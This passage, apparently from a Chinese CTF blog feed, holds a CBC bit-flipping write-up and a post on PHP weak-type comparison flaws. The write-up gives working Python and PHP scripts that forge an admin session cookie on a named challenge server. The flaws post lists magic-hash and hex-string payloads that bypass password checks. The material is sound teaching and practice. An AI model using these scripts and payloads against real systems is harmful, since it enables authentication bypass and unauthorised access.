class="string">"a:2:&#123;s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";&#125;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Plaintext before attack: <span class="variable">$v</span>\n"</span>;</span><br><span class="line"><span class="variable">$b</span> = array();</span><br><span class="line"><span class="variable">$enc</span> = array();</span><br><span class="line"><span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>);</span><br><span class="line"><span class="variable">$enc</span>[2] =  chr(ord(<span class="variable">$enc</span>[2]) ^ ord(<span class="string">"6"</span>) ^ ord (<span class="string">"7"</span>));</span><br><span class="line"><span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Plaintext AFTER attack : <span class="variable">$b</span>\n"</span>;</span><br></pre></td></tr></table></figure></p><h1 id="一道ctf题目"><a href="#一道ctf题目" class="headerlink" title="一道ctf题目"></a>一道ctf题目</h1><p><a href="http://47.93.190.246:49168/index.php" target="_blank" rel="noopener">http://47.93.190.246:49168/index.php</a></p><p><img src="1_1.png" alt></p><p>无法用 admin 登录，其它帐号名任意登录。<br>题目提示 CBC 字节翻转 有 .index.php.swp 文件下载。<br>用 vim -r .index.php.swp 打开即，用 :w index.php 另存为 index.php，即可还原出源代码。<br>关键代码段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_random_iv</span></span>()&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> login(<span class="variable">$info</span>)&#123;</span><br><span class="line">    <span class="variable">$iv</span> = get_random_iv();</span><br><span class="line">    <span class="variable">$plain</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = openssl_encrypt(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$info</span>[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode(<span class="variable">$iv</span>));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_login</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]) &amp;&amp; isset(<span class="variable">$_COOKIE</span>[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = openssl_decrypt(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = unserialize(<span class="variable">$plain</span>) or die(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode(<span class="variable">$plain</span>).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$info</span>[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">show_homepage</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;hello '</span>.<span class="variable">$_SESSION</span>[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们登录名 admiz 密码 bb 的 COOKIE 信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 47.93.190.246:49168</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line">Referer: http://47.93.190.246:49168/index.php</span><br><span class="line">Cookie: PHPSESSID=7nld2kvg1t560mtvuniqo63u02; iv=KYVIlJkfaja2cM8pENnLDg%3D%3D; cipher=3TFLhFRlhpfCeag8v7t% 2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D </span><br><span class="line">Connection: close </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>尝试更改 iv 或 cipher 的单个字节<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjg6InVzZXJuYYLHOrSKF5f/2bmVuBfm/45zOjg6InBhc3EXb3JkIjtzOjI6 ImJiIjt9</span><br></pre></td></tr></table></figure></p><p>BASE64 解码看一下信息，发现序列完全被破坏：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"usernaÇ:´ÿÙ¹¸æÿs:8:"</span>pasqord<span class="string">";s:2:"</span>bb<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure></p><p>再换个字节：a:2:{s:8:”username”;s:5:”admiz”;ÚJW¹¼=;o·$YL::”bb”;} 反序列化失败。 </p><p>我们要修改 admiz 为 admin 先分组，我们只关心前两组<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一组： a:2:&#123;s:8:<span class="string">"userna </span></span><br><span class="line"><span class="string">第二组： me"</span>;s:5:<span class="string">"admiz"</span>;</span><br></pre></td></tr></table></figure></p><p>z 位于第二组第 14 个字节，为改变 z 我们要改变第一组第 14 个字节<br>我们将其异或掉 z,再异或以 n。<br>代码如下：</p><p>python版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import base64,urllib2</span><br><span class="line">cipher=base64.b64decode(urllib2.unquote(<span class="string">"3TFLhFRlhpfCe ag8v7t%2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D"</span>)) newcipher=cipher[0:13]+chr(ord(cipher[13])^ord(<span class="string">'z'</span>)^or d(<span class="string">'n'</span>))+cipher[14:] newcipher=urllib2.quote(base64.b64encode(newcipher)) </span><br><span class="line"><span class="built_in">print</span> newcipher</span><br></pre></td></tr></table></figure></p><p>php版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">"3TFLhFRlhpfCeag8v69+tsVZnK+l5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaSWihjHwQ=="</span>;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="variable">$cipher</span>);</span><br><span class="line"><span class="variable">$cipher</span>[9] = chr(ord(<span class="variable">$cipher</span>[9]) ^ ord(<span class="string">"q"</span>) ^ ord (<span class="string">"a"</span>));</span><br><span class="line"><span class="variable">$newcipher</span> = base64_encode(<span class="variable">$cipher</span>);</span><br><span class="line"><span class="variable">$newcipher1</span> = urlencode(<span class="variable">$newcipher</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newcipher</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newcipher1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3TFLhFRlhpfCeag8v69%2BtsVZnK% 2Bl5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaS WihjHwQ%3D%3D</span><br></pre></td></tr></table></figure></p><p>将此字符串作新的 cipher 值与原 iv 值一起提交返回如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;base64 _decode(<span class="string">'GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzO jg6InBhc3N3b3JkIjtzOjI6ImJiIjt9'</span>) can<span class="string">'t unserialize&lt;/p&gt;</span></span><br></pre></td></tr></table></figure></p><p>Base64解码得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Î§DmZr¥e«Õlü me<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:2:"</span>bb<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure></p><p>发现序列完全被破坏, 反序列化失败。 原因是第一个块数据（16字节）被破坏了。因为要 username 要等于 admin 所以不能利用文章（0x03一个练习中）里的说的填充字符。<br>又因为是第一个块数据被破坏，第一个块数据是和 IV 有关，所以只要将在 CBC 字符翻转攻击，得到新的 IV 就可以修复第一块数据, 我们将 IV 值异或掉 data 的前16字节（用返回的 Base64 解码的明文信息 data），再异或我们要明文<br>代码如下：</p><p>python版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64,urllib2</span><br><span class="line">first_16Bytes=<span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line">data=base64.b64decode(urllib2.unquote(<span class="string">"GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9"</span>))</span><br><span class="line">iv=base64.b64decode(urllib2.unquote(<span class="string">"KYVIlJkfaja2cM8pENnLDg%3D%3D"</span>))</span><br><span class="line">newiv=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):</span><br><span class="line">    newiv+=chr(ord(first_16Bytes[i])^ord(iv[i])^ord(data[i])) </span><br><span class="line"><span class="built_in">print</span> urllib2.quote(base64.b64encode(newiv))</span><br></pre></td></tr></table></figure></p><p>php版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$first_16Bytes</span>=<span class="string">'a:2:&#123;s:8:"userna'</span>;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="string">'GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9'</span>);</span><br><span class="line"><span class="variable">$iv</span>=base64_decode(<span class="string">'KYVIlJkfaja2cM8pENnLDg=='</span>);</span><br><span class="line"><span class="variable">$newiv</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$newiv</span>.=chr(ord(<span class="variable">$first_16Bytes</span>[<span class="variable">$i</span>])^ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$cipher</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newiv</span> = base64_encode(<span class="variable">$newiv</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newiv</span>;</span><br><span class="line"><span class="variable">$newiv</span> = urlencode(<span class="variable">$newiv</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newiv</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cbc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php弱类型漏洞</title>
      <link href="/2017/12/21/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
      <url>/2017/12/21/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>常见的 php 弱类型归纳</p><a id="more"></a><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>php中有两种比较的符号 == 与 ===<br>$a = $b ;<br>$a===$b ;<br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。<br>类型转换是无法避免的问题。例如需要将 GET 或者是 POST 的参数转换为 int 类型，或者是两个变量不匹配的时候，PHP 会自动地进行变量转换。但是 PHP 是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题。</p><h1 id="常见的漏洞"><a href="#常见的漏洞" class="headerlink" title="常见的漏洞"></a>常见的漏洞</h1><h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>在 $a==$b 的比较中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=null;<span class="variable">$b</span>=flase ; //<span class="literal">true</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">''</span>;<span class="variable">$b</span>=null; //<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>这样的例子还有很多，这种比较都是相等。<br>使用比较操作符的时候也存在类型转换的问题，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0==<span class="string">'0'</span> //<span class="literal">true</span></span><br><span class="line">0 == <span class="string">'abcdefg'</span> //<span class="literal">true</span></span><br><span class="line">0 === <span class="string">'abcdefg'</span> //<span class="literal">false</span></span><br><span class="line">1 == <span class="string">'1abcdef'</span> //<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含 ‘.’,’e’,’E’ 并且其数值值在整形的范围之内，该字符串被当作 int 来取值，其他所有情况下都被作为 float 来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为 0。<br>Example1：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=1 + <span class="string">"10.5"</span>; // <span class="variable">$test</span>=11.5(<span class="built_in">float</span>)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"-1.3e3"</span>; //<span class="variable">$test</span>=-1299(<span class="built_in">float</span>)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"bob-1.3e3"</span>;//<span class="variable">$test</span>=1(int)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"2admin"</span>;//<span class="variable">$test</span>=3(int)</span><br><span class="line"><span class="variable">$test</span>=1+<span class="string">"admin2"</span>;//<span class="variable">$test</span>=1(int)</span><br></pre></td></tr></table></figure></p><p>Example2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"THIS IS FLAG"</span>; </span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (0 &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, <span class="variable">$password</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Wrong Format'</span>; </span><br><span class="line">        <span class="built_in">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">while</span> (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </span><br><span class="line">        <span class="keyword">if</span> (6 &gt; preg_match_all(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>)) </span><br><span class="line">            <span class="built_in">break</span>; </span><br><span class="line">        <span class="variable">$c</span> = 0; </span><br><span class="line">        <span class="variable">$ps</span> = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span><br><span class="line">        foreach (<span class="variable">$ps</span> as <span class="variable">$pt</span>) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:<span class="variable">$pt</span>:]]+/"</span>, <span class="variable">$password</span>)) </span><br><span class="line">                <span class="variable">$c</span> += 1; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$c</span> &lt; 3) <span class="built_in">break</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == <span class="variable">$password</span>) <span class="built_in">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">'Wrong password'</span>; </span><br><span class="line">        <span class="built_in">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload: password=42.00e+0000000000</span><br></pre></td></tr></table></figure></p><h2 id="Hash比较"><a href="#Hash比较" class="headerlink" title="Hash比较"></a>Hash比较</h2><p>在进行 hash 比较的时候也会存在问题。如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"0e132456789"</span>==<span class="string">"0e7124511451155"</span> //<span class="literal">true</span></span><br><span class="line"><span class="string">"0e123456abc"</span>==<span class="string">"0e1dddada"</span> //<span class="literal">false</span></span><br><span class="line"><span class="string">"0e1abc"</span>==<span class="string">"0"</span>  //<span class="literal">true</span></span><br><span class="line">QNKCDZO==0e830400451993494058024219903391</span><br><span class="line">s878926199a==0e545993274517709034328855841020</span><br><span class="line">s155964671a==0e342768416822451524974117254469</span><br><span class="line">s214587387a==0e848240448830537924465865611904</span><br></pre></td></tr></table></figure></p><p>在进行比较运算时，如果遇到了 0e\d+ 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 0e\d+ 这种模式就不会相等。</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="built_in">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:  http://chinalover.sinaapp.com/web19/?a=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="十六进制转换"><a href="#十六进制转换" class="headerlink" title="十六进制转换"></a>十六进制转换</h2><p>还存在一种十六进制余字符串进行比较运算时的问题。<br>例子如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"123456"</span> //<span class="literal">true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==123456 //<span class="literal">true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"1e240"</span> //<span class="literal">false</span></span><br></pre></td></tr></table></figure></p><p>当其中的一个字符串是 0x 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与 int 类型和 string 类型的 123456 比较都是相等。<br>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="keyword">function</span> noother_says_correct(<span class="variable">$number</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$one</span> = ord(<span class="string">'1'</span>);</span><br><span class="line">        <span class="variable">$nine</span> = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="built_in">return</span> <span class="variable">$number</span> == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct(<span class="variable">$_GET</span>[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:  http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</span><br></pre></td></tr></table></figure></p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>常见的转换主要就是 int 转换为 string，string 转换为 int。<br>int 转 string：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = 5;</span><br><span class="line">方式1：<span class="variable">$item</span> = (string)<span class="variable">$var</span>;</span><br><span class="line">方式2：<span class="variable">$item</span> = strval(<span class="variable">$var</span>);</span><br></pre></td></tr></table></figure></p><p>string 转 int：intval() 函数。(取整函数)<br>对于这个函数，可以先看2个例子。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(<span class="string">'2'</span>)) //2</span><br><span class="line">var_dump(intval(<span class="string">'3abcd'</span>)) //3</span><br><span class="line">var_dump(intval(<span class="string">'abcd'</span>)) //0</span><br></pre></td></tr></table></figure></p><p>说明 intval() 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。<br>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 